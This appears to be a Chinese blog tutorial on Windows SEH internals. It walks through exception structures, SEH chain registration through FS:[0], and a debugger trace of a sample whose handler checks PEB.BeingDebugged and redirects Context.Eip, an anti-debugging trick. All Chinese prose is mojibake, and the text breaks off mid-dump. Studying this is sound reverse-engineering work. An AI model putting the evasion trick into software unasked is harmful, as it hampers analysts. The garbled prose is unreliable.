<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> &#123;</span></span><br><span class="line">    DWORD    ExceptionCode;<span class="comment">//å¼‚å¸¸ç¼–å·</span></span><br><span class="line">    DWORD ExceptionFlags;<span class="comment">//å¼‚å¸¸æ ‡å¿—</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> *<span class="title">ExceptionRecord</span>;</span><span class="comment">//</span></span><br><span class="line">    PVOID ExceptionAddress;<span class="comment">//å¼‚å¸¸å‘ç”Ÿåœ°å€</span></span><br><span class="line">    DWORD NumberParameters;</span><br><span class="line">    ULONG_PTR ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];</span><br><span class="line">&#125; EXCEPTION_RECORD;</span><br></pre></td></tr></table></figure>
<p>è¿”å›å€¼æ˜¯ä¸€ä¸ªæšä¸¾ç±»å‹,åœ¨excpt.hä¸­å¯ä»¥æ‰¾åˆ°å…¶å®šä¹‰</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Exception disposition return values</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">EXCEPTION_DISPOSITION</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ExceptionContinueExecution,<span class="comment">//ç»§ç»­æ‰§è¡Œå¼‚å¸¸ä»£ç </span></span><br><span class="line">    ExceptionContinueSearch,<span class="comment">//æ‰§è¡Œsehé“¾ä¸Šä¸‹ä¸€ä¸ªå¼‚å¸¸å¤„ç†</span></span><br><span class="line">    ExceptionNestedException,<span class="comment">//OSå†…éƒ¨ä½¿ç”¨</span></span><br><span class="line">    ExceptionCollidedUnwind<span class="comment">//OSå†…éƒ¨ä½¿ç”¨</span></span><br><span class="line">&#125; EXCEPTION_DISPOSITION;</span><br></pre></td></tr></table></figure>
<p>SEHé“¾ç”»åœ¨å›¾ä¸Šç›¸å½“äº</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924093920177.png"
alt="image-20220924093920177" />
<figcaption aria-hidden="true">image-20220924093920177</figcaption>
</figure>
<p>æœ€åä¸€ä¸ªèŠ‚ç‚¹çš„nextæŒ‡å‘FFFFFFFF,å³-1,è¡¨æ˜SEHé“¾ç»“æŸ</p>
<h2 id="è®¿é—®è¿›ç¨‹sehé“¾">è®¿é—®è¿›ç¨‹SEHé“¾</h2>
<p>TEB+0x00å­˜æ”¾çš„æ˜¯NtTibç»“æ„ä½“åŸºåœ°å€</p>
<p>è¿™ä¸ªNtTibé•¿å•¥æ ·å‘¢?</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">ExceptionList</span>;</span><span class="comment">//sehé“¾è¡¨å¤´</span></span><br><span class="line">    PVOID StackBase;</span><br><span class="line">    PVOID StackLimit;</span><br><span class="line">    PVOID SubSystemTib;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_MSC_EXTENSIONS)</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        PVOID FiberData;</span><br><span class="line">        DWORD Version;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    PVOID FiberData;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    PVOID ArbitraryUserPointer;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> *<span class="title">Self</span>;</span></span><br><span class="line">&#125; NT_TIB;</span><br><span class="line"><span class="keyword">typedef</span> NT_TIB *PNT_TIB;</span><br></pre></td></tr></table></figure>
<p>NtTibåœ¨TEBçš„0åç§»ä½ç½®,ExceptionListåœ¨NtTibçš„åç§»ä½ç½®,FSæ®µé€‰æ‹©å­æŒ‡å‘TEBæè¿°ç¬¦,å› æ­¤</p>
<p><code>FS:[0]=TEB=TEB.NtTib=TEB.NtTib.ExceptionList</code></p>
<p>å¦‚æ­¤å°±å¯ä»¥è®¿é—®SEHé“¾è¡¨äº†,è¿™é‡ŒExceptionListç›¸å½“äºä¸€ä¸ªé™„åŠ å¤´èŠ‚ç‚¹</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924100243035.png"
alt="image-20220924100243035" />
<figcaption aria-hidden="true">image-20220924100243035</figcaption>
</figure>
<h2 id="å®‰è£…sehèŠ‚ç‚¹">å®‰è£…SEHèŠ‚ç‚¹</h2>
<p>cè¯­è¨€ä¸­ä½¿ç”¨<code>__try,__except,__finally</code>å…³é”®å­—</p>
<p>æ±‡ç¼–è¯­è¨€ä¸­åªéœ€è¦å°†SEHèŠ‚ç‚¹å¤´æ’è¿›å…¥SEHèŠ‚ç‚¹å°±å¯ä»¥äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PUSH &amp;myHandler	;sehèŠ‚ç‚¹çš„å‡½æ•°åœ°å€å‹æ ˆ</span><br><span class="line">PUSH DWORD PTR FS:[0] ;sehèŠ‚ç‚¹çš„åå‘æŒ‡é’ˆå‹æ ˆ,å¤´æ’æ³•é‡‡ç”¨åŸæ¥çš„å¤´</span><br><span class="line">MOV DWORD PTR FS:[0],ESP	;å½“å‰èŠ‚ç‚¹æ­£å¥½ä½äºæ ˆé¡¶,å°†å…¶åœ°å€æ”¾åˆ°ExceptionListä¸Šè¦†ç›–åŸæ¥çš„å¤´èŠ‚ç‚¹</span><br></pre></td></tr></table></figure>
<p>å½“å‰èŠ‚ç‚¹æˆä¸ºSEHé“¾çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹</p>
<h2 id="è°ƒè¯•è§‚å¯Ÿsehå·¥ä½œæµç¨‹">è°ƒè¯•è§‚å¯ŸSEHå·¥ä½œæµç¨‹</h2>
<h3 id="mainä¹‹å‰å»ºç«‹çš„sehé“¾">mainä¹‹å‰å»ºç«‹çš„sehé“¾</h3>
<p>ç”¨idaæ‰“å¼€seh.exeè§‚å¯Ÿ</p>
<p>ä½¿ç”¨odåŠ¨æ€è°ƒè¯•seh.exe,è®©ç¨‹åºå…ˆè¿è¡Œåˆ°mainå‡½æ•°0x401000å¤„</p>
<p>odå·²ç»è¯†åˆ«å‡ºmainä¸€å¼€å§‹å¹²äº†å•¥äº†</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924101626865.png"
alt="image-20220924101626865" />
<figcaption aria-hidden="true">image-20220924101626865</figcaption>
</figure>
<p>åœ¨å¤´æ’ä¹‹å‰,å…ˆçœ‹ä¸€ä¸‹åŸæ¥çš„ç¬¬ä¸€ä¸ªsehèŠ‚ç‚¹</p>
<p>æ­¤æ—¶<code>fs:[00000000]=[00386000]=0019FF64</code>,å»æ ˆä¸­0x19FF64çœ‹çœ‹</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924101716815.png"
alt="image-20220924101716815" />
<figcaption aria-hidden="true">image-20220924101716815</figcaption>
</figure>
<p>ä¸‹ä¸€ä¸ªsehèŠ‚ç‚¹åœ¨0x19FFCCä½ç½®,æœ¬sehèŠ‚ç‚¹çš„å¼‚å¸¸å¤„ç†å‡½æ•°åœ¨0x402730,ç”¨idaè§‚å¯Ÿè¿™ä¸ªä½ç½®</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924101908760.png"
alt="image-20220924101908760" />
<figcaption aria-hidden="true">image-20220924101908760</figcaption>
</figure>
<p>è¿™ä¸ªå‡½æ•°å¾ˆå¤§,çœ‹åœ°å€æ˜¯åœ¨ç”¨æˆ·ç©ºé—´çš„,ä¸æ˜¯DLLä¸­çš„ä¹Ÿä¸æ˜¯å†…æ ¸ä¸­çš„,é‚£ä¹ˆå®ƒæ˜¯å•¥æ—¶å€™æ³¨å†Œçš„å‘¢?</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">start()</span><br><span class="line">	___tmainCRTStartup()</span><br><span class="line">		__cinit()</span><br><span class="line">			__IsNonwritableInCurrentImage()</span><br><span class="line">    	main()</span><br></pre></td></tr></table></figure>
<p>åœ¨mainä¹‹å‰<code>___tmainCRTStartup</code>ä¼šé¦–å…ˆè°ƒç”¨<code>__cinit</code>è¿›è¡Œæ³¨å†Œ,ç„¶åæ‰ä¼šè°ƒç”¨<code>main</code></p>
<p>ä¹Ÿå°±æ˜¯è¯´,è¿™æ˜¯è¿è¡Œåº“æ³¨å†Œçš„</p>
<h3 id="æ³¨å†Œæ–°çš„sehèŠ‚ç‚¹">æ³¨å†Œæ–°çš„sehèŠ‚ç‚¹</h3>
<p>æ³¨æ„æ­¤æ—¶åªæ˜¯æ³¨å†Œ,å…¶ä¸­çš„å¼‚å¸¸å¤„ç†å‡½æ•°ä¹Ÿæ˜¯ä¸€ä¸ªå›è°ƒå‡½æ•°,ä¸ä¼šç«‹åˆ»æ‰§è¡Œ,éœ€è¦ç¡®å®å‘ç°å¼‚å¸¸çš„æ—¶å€™æ‰ä¼šæ‰§è¡Œ</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924100616558.png"
alt="image-20220924100616558" />
<figcaption aria-hidden="true">image-20220924100616558</figcaption>
</figure>
<p>mainå‡½æ•°é¦–å…ˆæ’å…¥äº†ä¸€ä¸ªsehèŠ‚ç‚¹,å…¶å¼‚å¸¸å¤„ç†å‡½æ•°åœ¨0x40105Aå¤„,è¿™ä¸ªå‡½æ•°å¹²äº†å•¥å‘¢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:0040105A loc_40105A:                             ; DATA XREF: _mainâ†‘o</span><br><span class="line">.text:0040105A                 mov     esi, [esp+0Ch];esiæŒ‡å‘æ ˆä¸­0x19f470</span><br><span class="line">.text:0040105E                 mov     eax, large fs:30h;PEBåœ°å€</span><br><span class="line">.text:00401064                 cmp     byte ptr [eax+2], 1;æ£€æŸ¥æ˜¯å¦BeingDebugged</span><br><span class="line">.text:00401068                 jnz     short loc_401076;å¦‚æœä¸æ˜¯åˆ™è·³è½¬0x4001076,å¦åˆ™é¡ºåºæ‰§è¡Œ</span><br><span class="line">.text:0040106A                 mov     dword ptr [esi+0B8h], offset loc_401023;å°†0x401023å†™åˆ°esi+0xB8hçš„åœ°æ–¹</span><br><span class="line">.text:00401074                 jmp     short loc_401080;è·³è½¬å‡½æ•°å°¾å£°</span><br><span class="line">.text:00401076 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401076</span><br><span class="line">.text:00401076 loc_401076:                             ; CODE XREF: .text:00401068â†‘j</span><br><span class="line">.text:00401076                 mov     dword ptr [esi+0B8h], offset loc_401039</span><br><span class="line">.text:00401080</span><br><span class="line">.text:00401080 loc_401080:                             ; CODE XREF: .text:00401074â†‘j</span><br><span class="line">.text:00401080                 xor     eax, eax</span><br><span class="line">.text:00401082                 retn;è¿”å›äº†</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªå‡½æ•°æ£€æŸ¥äº†å½“å‰æ˜¯å¦å¤„äºè°ƒè¯•çŠ¶æ€,æ ¹æ®è¯¥çŠ¶æ€å°†ä¸åŒçš„å‡½æ•°åœ°å€,å†™åˆ°esi+0xB8hæŒ‡å‘çš„åœ°æ–¹</p>
<p>è¿™æ˜¯ä¸ªä»€ä¹ˆåœ°æ–¹å‘¢?Context.Eip,å¹²å•¥ç”¨çš„å‘¢?ç•™ä½œåè¯</p>
<p>å½“æˆ‘ä»¬çš„sehèŠ‚ç‚¹æ³¨å†Œå®Œæ¯•ä¹‹å</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">esp=0019FF28</span><br><span class="line">fs:[00000000]=[00386000]=0019FF28</span><br></pre></td></tr></table></figure>
<p>æ­¤æ—¶ExceptionListå·²ç»æŒ‡å‘0x19FF28äº†,æ ˆä¸­è§‚å¯Ÿè¿™ä¸ªä½ç½®</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924105650611.png"
alt="image-20220924105650611" />
<figcaption aria-hidden="true">image-20220924105650611</figcaption>
</figure>
<p>åå‘æŒ‡é’ˆä¹Ÿå·²ç»æŒ‡å‘äº†åˆšæ‰çš„0x40105AèŠ‚ç‚¹.ç°åœ¨çš„SEHé“¾é•¿è¿™æ ·</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ExceptionList@0x386000-&gt;</span><br><span class="line">	myNode@0x19FF28-&gt;</span><br><span class="line">	CRTNode@0x19FF64-&gt;</span><br><span class="line">	ntdllNode1@0x19FFCC-&gt;</span><br><span class="line">	ntdllNode2@0x19FFE4-&gt;</span><br><span class="line">	-1</span><br></pre></td></tr></table></figure>
<p>å¦‚æœå‘ç”Ÿå¼‚å¸¸,é¦–å…ˆä¼šè°ƒç”¨è¿™ä¸ªé“¾æœ€å¤´ä¸Šçš„<code>myNode@0x19FF28</code>ä¸­çš„å¼‚å¸¸å¤„ç†å‡½æ•°</p>
<p>odå·²ç»è‡ªåŠ¨è¯†åˆ«å‡ºsehé“¾é•¿å•¥æ ·äº†,od-&gt;æŸ¥çœ‹-&gt;sehé“¾</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924110529629.png"
alt="image-20220924110529629" />
<figcaption aria-hidden="true">image-20220924110529629</figcaption>
</figure>
<h3 id="å¼•å‘å¼‚å¸¸">å¼•å‘å¼‚å¸¸</h3>
<p>åœ¨æ³¨å†Œå®Œæˆ‘ä»¬çš„sehèŠ‚ç‚¹ä¹‹å,æœ‰ä¸¤å¥æ•…æ„æ‰¾èŒ¬çš„æŒ‡ä»¤,æŒ‰ç†è¯´cè¯­è¨€æ˜¯æ•²ä¸å‡ºè¿™ç§æŒ‡ä»¤çš„,å®é™…ä¸Šæ˜¯ç”¨å†…è”æ±‡ç¼–å†™çš„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00401017 xor     eax, eax</span><br><span class="line">.text:00401019 mov     dword ptr [eax], 1</span><br></pre></td></tr></table></figure>
<p>æŠŠ1å†™åˆ°0x0ä½ç½®,æ˜¾ç„¶å¾€æœªæ³¨å†Œè¿‡çš„å†…å­˜å†™ä¸œè¥¿ä¼šå¯„,è§¦å‘EXCEPTION_ACCESS_VIOLATION(0xc0000005)å¼‚å¸¸</p>
<h3 id="æ‰§è¡Œå¼‚å¸¸å¤„ç†å‡½æ•°">æ‰§è¡Œå¼‚å¸¸å¤„ç†å‡½æ•°</h3>
<p>è§¦å‘å¼‚å¸¸ä¹‹å,ç¨‹åºä¼šè·³è½¬åˆ°ç¬¬ä¸€ä¸ªsehèŠ‚ç‚¹ä¸­æ³¨å†Œçš„å¼‚å¸¸å¤„ç†å‡½æ•°,æœŸé—´ç»è¿‡äº†å¾ˆå¤šåº“å‡½æ•°è°ƒç”¨,å¯¼è‡´æ ˆé¡¶ç§»åŠ¨äº†å¾ˆè¿œçš„è·ç¦»</p>
<p>ä»0x19FF28åˆ°0x19F320ä¸€å…±0xc08ä¸ªå­—èŠ‚</p>
<p>æ­¤æ—¶æ§åˆ¶å·²ç»è½¬ç§»åˆ°myHandler@0x40105A,è¿™å°±æ˜¯mainå‡½æ•°ä¸€å¼€å§‹æ³¨å†Œçš„sehèŠ‚ç‚¹ä¸­çš„å¼‚å¸¸å¤„ç†å‡½æ•°</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924112137415.png"
alt="image-20220924112137415" />
<figcaption aria-hidden="true">image-20220924112137415</figcaption>
</figure>
<p>æ­¤æ—¶æ ˆå¸§çš„æƒ…å†µ</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924112208795.png"
alt="image-20220924112208795" />
<figcaption aria-hidden="true">image-20220924112208795</figcaption>
</figure>
<p>myHandler@0x40105Açš„è¿”å›åœ°å€æ˜¯NTDLLåº“å‡½æ•°</p>
<p>è¿”å›åœ°å€å¾€ä¸Šçš„4ä¸ªåŒå­—å°±æ˜¯myHandlerçš„å‚æ•°äº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">EXCEPTION_DISPOSITION <span class="title function_">myHandler</span><span class="params">(<span class="comment">//è¿”å›å€¼ä¸ºæšä¸¾ç±»å‹,è¡¨æ˜æœ¬å‡½æ•°å¤„ç†ç»“æŸåç¨‹åºçš„èµ°å‘</span></span></span><br><span class="line"><span class="params">    EXCEPTION_RECORD *pRecord,</span></span><br><span class="line"><span class="params">    EXCEPTION_REGISTRATION_RECORD *pFrame,</span></span><br><span class="line"><span class="params">    PCONTEXT Context,<span class="comment">//çº¿ç¨‹ä¸Šä¸‹æ–‡,åŒ…æ‹¬å„ç§å¯„å­˜å™¨å€¼</span></span></span><br><span class="line"><span class="params">    PVOID pValue,<span class="comment">//ç³»ç»Ÿå†…éƒ¨ä½¿ç”¨,å¿½ç•¥</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>å‚æ•°åœ°å€</th>
<th>å‚æ•°æŒ‡å‘</th>
</tr>
</thead>
<tbody>
<tr>
<td>pRecord</td>
<td>0x19F324</td>
<td>0x19F420</td>
</tr>
<tr>
<td>pFrame</td>
<td>0x19F328</td>
<td>0x19FF28</td>
</tr>
<tr>
<td>Context</td>
<td>0x19F32C</td>
<td>0x19F470</td>
</tr>
<tr>
<td>pValue</td>
<td>0x19F330</td>
<td>0x19F3AC</td>
</tr>
</tbody>
</table>
<p>å‚æ•°æŒ‡å‘çš„åœ°å€éƒ½åœ¨æ ˆä¸­,çœ‹æ¥æŠ¬æ ˆ0xc08ä¸ªå­—èŠ‚å…¶ä¸­çš„ä½œç”¨å°±æœ‰å‡†å¤‡å‚æ•°</p>
<h4 id="record0x19f420"><code>Record@0x19F420</code></h4>
<p>Record@0x19F420é•¿è¿™æ ·</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> &#123;</span><span class="comment">//0x50ä¸ªå­—èŠ‚</span></span><br><span class="line">    DWORD    ExceptionCode;</span><br><span class="line">    DWORD ExceptionFlags;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> *<span class="title">ExceptionRecord</span>;</span></span><br><span class="line">    PVOID ExceptionAddress;</span><br><span class="line">    DWORD NumberParameters;</span><br><span class="line">    ULONG_PTR ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];</span><br><span class="line">&#125; EXCEPTION_RECORD;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924113817007.png"
alt="image-20220924113817007" />
<figcaption aria-hidden="true">image-20220924113817007</figcaption>
</figure>
<table>
<colgroup>
<col style="width: 10%" />
<col style="width: 29%" />
<col style="width: 11%" />
<col style="width: 48%" />
</colgroup>
<thead>
<tr>
<th>åç§»</th>
<th>æˆå‘˜</th>
<th>å€¼</th>
<th>æ„ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>ExceptionCode</td>
<td>0xC0000005</td>
<td>è®¿é—®éæ³•å†…å­˜</td>
</tr>
<tr>
<td>0x4</td>
<td>ExceptionFlags</td>
<td>0</td>
<td></td>
</tr>
<tr>
<td>0x8</td>
<td>ExceptionRecord</td>
<td>0</td>
<td></td>
</tr>
<tr>
<td>0xC</td>
<td>ExceptionAddress</td>
<td>0x401019</td>
<td><code>.text:00401019 mov     dword ptr [eax], 1</code></td>
</tr>
<tr>
<td>0x10</td>
<td>NumberParameters</td>
<td>2</td>
<td></td>
</tr>
<tr>
<td>0x14</td>
<td>ExceptionInformation[0]</td>
<td>1</td>
<td></td>
</tr>
<tr>
<td>0x15-0x69</td>
<td>ExceptionInformation[1-..]</td>
<td>0</td>
<td></td>
</tr>
</tbody>
</table>
<h4 id="frame0x19ff28"><code>Frame@0x19FF28</code></h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> &#123;</span><span class="comment">//8å­—èŠ‚</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">Next</span>;</span></span><br><span class="line">    PEXCEPTION_ROUTINE Handler;</span><br><span class="line">&#125; EXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924122503631.png"
alt="image-20220924122503631" />
<figcaption aria-hidden="true">image-20220924122503631</figcaption>
</figure>
<h4 id="context0x19f470"><code>Context@0x19F470</code></h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DECLSPEC_NOINITALL</span> _<span class="title">CONTEXT</span> &#123;</span><span class="comment">//0x2ccä¸ªå­—èŠ‚</span></span><br><span class="line">    DWORD ContextFlags;</span><br><span class="line"></span><br><span class="line">    DWORD   Dr0;</span><br><span class="line">    DWORD   Dr1;</span><br><span class="line">    DWORD   Dr2;</span><br><span class="line">    DWORD   Dr3;</span><br><span class="line">    DWORD   Dr6;</span><br><span class="line">    DWORD   Dr7;</span><br><span class="line"></span><br><span class="line">    FLOATING_SAVE_AREA FloatSave;</span><br><span class="line">    </span><br><span class="line">    DWORD   SegGs;</span><br><span class="line">    DWORD   SegFs;</span><br><span class="line">    DWORD   SegEs;</span><br><span class="line">    DWORD   SegDs;</span><br><span class="line"></span><br><span class="line">    DWORD   Edi;</span><br><span class="line">    DWORD   Esi;</span><br><span class="line">    DWORD   Ebx;</span><br><span class="line">    DWORD   Edx;</span><br><span class="line">    DWORD   Ecx;</span><br><span class="line">    DWORD   Eax;</span><br><span class="line"></span><br><span class="line">    DWORD   Ebp;</span><br><span class="line">    DWORD   Eip;	<span class="comment">//offset=0xB8</span></span><br><span class="line">    DWORD   SegCs;              <span class="comment">// MUST BE SANITIZED</span></span><br><span class="line">    DWORD   EFlags;             <span class="comment">// MUST BE SANITIZED</span></span><br><span class="line">    DWORD   Esp;</span><br><span class="line">    DWORD   SegSs;<span class="comment">//C8</span></span><br><span class="line"></span><br><span class="line">    BYTE    ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];</span><br><span class="line"></span><br><span class="line">&#125; CONTEXT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> CONTEXT *PCONTEXT;</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">==&gt;    0019F470   |0001007F</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+4      0019F474   |004011C2                                  è¿”å›åˆ° seh.004011C2 æ¥è‡ª seh.00401000</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+8      0019F478   |00000000</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+C      0019F47C   |00000000</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+10     0019F480   |00000000</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+14     0019F484   |FFFF0FF0</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+18     0019F488   |00000100</span></span><br><span class="line">çœç•¥æµ®ç‚¹æ•°å¯„å­˜å™¨</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+88     0019F4F8   |00000000	;segGS</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+8C     0019F4FC   |0000002B</span>	</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+90     0019F500   |00000053	;FS</span>	</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+94     0019F504   |0000002B	;ES</span>	</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+98     0019F508   |0000002B   ;DS</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+9C     0019F50C   |00401219   ;EDI                            seh.&lt;ModuleEntryPoint&gt;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+A0     0019F510   |00401219   ;ESI                            seh.&lt;ModuleEntryPoint&gt;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+A4     0019F514   |002CF000	;Ebx</span> </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+A8     0019F518   |005BF5B8	;Edx</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+AC     0019F51C   |00000001	;Ecx</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+B0     0019F520   |00000000	;Eax</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+B4     0019F524   |0019FF74	;EBP</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+B8     0019F528   |00401019   ;Eip                               seh.00401019</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+BC     0019F52C   |00000023	;CS</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+C0     0019F530   |00010246	;Eflags</span>	</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+C4     0019F534   |0019FF28	;Esp</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">+C8     0019F538   |0000002B	